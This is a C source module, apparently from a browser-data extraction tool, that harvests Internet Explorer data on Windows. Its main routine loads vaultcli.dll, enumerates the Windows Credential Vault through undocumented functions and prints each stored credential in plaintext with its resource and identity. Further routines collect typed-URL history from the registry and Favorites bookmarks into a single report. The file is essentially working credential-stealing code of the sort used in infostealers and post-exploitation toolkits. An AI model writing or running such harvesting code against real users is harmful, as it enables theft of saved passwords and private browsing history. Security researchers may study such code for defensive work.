/* IE browser data extraction */
#include "browser/ie.h"
#include "browser/utils.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>
#include <winreg.h>
#include <time.h>

static char* to_utf8(const wchar_t* wstr) {
    if (!wstr) return NULL;
    int n = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    char* r = (char*)malloc(n + 1);
    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, r, n, NULL, NULL);
    return r;
}

static const char* ie_get_logins(void) {
    static char buf[65536]; int p = 0; buf[0] = 0;
    print_verbose("Getting IE credentials");

    HMODULE hv = LoadLibraryA("vaultcli.dll");
    if (!hv) return "";
    typedef DWORD (WINAPI *VEV_t)(DWORD, DWORD*, GUID**);
    typedef DWORD (WINAPI *VOV_t)(GUID*, DWORD, void**);
    typedef DWORD (WINAPI *VEI_t)(void*, DWORD, DWORD*, void***);
    typedef DWORD (WINAPI *VGI_t)(void*, GUID*, void*, void*, void*, DWORD, void**);
    VEV_t VEV = (VEV_t)GetProcAddress(hv, "VaultEnumerateVaults");
    VOV_t VOV = (VOV_t)GetProcAddress(hv, "VaultOpenVault");
    VEI_t VEI = (VEI_t)GetProcAddress(hv, "VaultEnumerateItems");
    VGI_t VGI = (VGI_t)GetProcAddress(hv, "VaultGetItem");
    if (!VEV || !VOV || !VEI || !VGI) { FreeLibrary(hv); return ""; }

    DWORD vc = 0; GUID* vg = NULL;
    if (VEV(0, &vc, &vg) != 0 || !vc) { FreeLibrary(hv); return ""; }

    for (DWORD vi = 0; vi < vc; vi++) {
        void* vh = NULL;
        if (VOV(&vg[vi], 0, &vh) != 0) continue;
        DWORD ic = 0; void** items = NULL;
        if (VEI(vh, 512, &ic, &items) != 0 || !ic) continue;

        char gs[64]; snprintf(gs, sizeof(gs), "%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X",
            vg[vi].Data1, vg[vi].Data2, vg[vi].Data3,
            vg[vi].Data4[0],vg[vi].Data4[1],vg[vi].Data4[2],vg[vi].Data4[3],
            vg[vi].Data4[4],vg[vi].Data4[5],vg[vi].Data4[6],vg[vi].Data4[7]);

        for (DWORD ii = 0; ii < ic; ii++) {
            unsigned char* item = (unsigned char*)items[ii];
            if (!item || ii > 1000) continue;
            char *ca = NULL, *cr = NULL, *ci = NULL;
            /* Access vault item fields — offsets fragile, use IsBadReadPtr guard */
            wchar_t** auth_ptr = (wchar_t**)(item + 40);
            wchar_t** res_ptr  = (wchar_t**)(item + 16);
            wchar_t** iden_ptr = (wchar_t**)(item + 24);
            if (IsBadReadPtr(auth_ptr, sizeof(void*)) ||
                IsBadReadPtr(res_ptr, sizeof(void*)) ||
                IsBadReadPtr(iden_ptr, sizeof(void*))) continue;
            wchar_t* auth_val = *auth_ptr;
            wchar_t* res_val  = *res_ptr;
            wchar_t* iden_val = *iden_ptr;
            if (auth_val && !IsBadReadPtr(auth_val, 2)) ca = to_utf8(auth_val);
            if (res_val  && !IsBadReadPtr(res_val, 2))  cr = to_utf8(res_val);
            if (iden_val && !IsBadReadPtr(iden_val, 2)) ci = to_utf8(iden_val);
            if (ca && *ca) {
                p += snprintf(buf + p, sizeof(buf)-p, "Vault: %s\n", gs);
                if (cr) p += snprintf(buf + p, sizeof(buf)-p, "Resource: %s\n", cr);
                if (ci) p += snprintf(buf + p, sizeof(buf)-p, "Identity: %s\n", ci);
                p += snprintf(buf + p, sizeof(buf)-p, "Credential: %s\n", ca);
            }
            free(ca); free(cr); free(ci);
        }
    }
    FreeLibrary(hv);
    return buf;
}

static const char* ie_get_history(void) {
    static char buf[8192]; int p = 0; buf[0] = 0;
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\TypedURLs", 0, KEY_READ, &hk)) return buf;
    for (int i = 1; i < 26; i++) {
        char nm[16]; snprintf(nm, sizeof(nm), "url%d", i);
        char val[2048] = {0}; DWORD sz = sizeof(val);
        if (RegQueryValueExA(hk, nm, NULL, NULL, (BYTE*)val, &sz) == ERROR_SUCCESS && val[0])
            p += snprintf(buf + p, sizeof(buf)-p, "URL: %s\n", val);
    }
    RegCloseKey(hk);
    return buf;
}

static const char* ie_get_bookmarks(void) {
    static char buf[16384]; int p = 0; buf[0] = 0;
    char fav[MAX_PATH], up[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", up, sizeof(up));
    snprintf(fav, sizeof(fav), "%s\\Favorites", up);
    if (!path_exists(fav)) return buf;
    char srch[MAX_PATH]; snprintf(srch, sizeof(srch), "%s\\*.url", fav);
    WIN32_FIND_DATAA fd; HANDLE hf = FindFirstFileA(srch, &fd);
    if (hf == INVALID_HANDLE_VALUE) return buf;
    do {
        if (fd.cFileName[0] == '.') continue;
        char fp[MAX_PATH]; snprintf(fp, sizeof(fp), "%s\\%s", fav, fd.cFileName);
        FILE* f = fopen(fp, "r");
        if (f) { char line[4096]; while (fgets(line, sizeof(line), f))
            if (strncmp(line, "URL=", 4) == 0) { char* u = line + 4; char* nl = strpbrk(u, "\r\n"); if (nl) *nl = 0; p += snprintf(buf + p, sizeof(buf)-p, "URL: %s\n", u); break; }
            fclose(f); }
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
    return buf;
}

const char* ie_get(void) {
    static char buf[65536]; buf[0] = 0;
    int p = snprintf(buf, sizeof(buf), "========================== IE (Current User) ==========================\n");
    const char* l = ie_get_logins(); if (l[0]) p += snprintf(buf + p, sizeof(buf)-p, "%s", l);
    const char* b = ie_get_bookmarks(); if (b[0]) p += snprintf(buf + p, sizeof(buf)-p, "%s", b);
    const char* h = ie_get_history(); if (h[0]) p += snprintf(buf + p, sizeof(buf)-p, "%s", h);
    return buf;
}
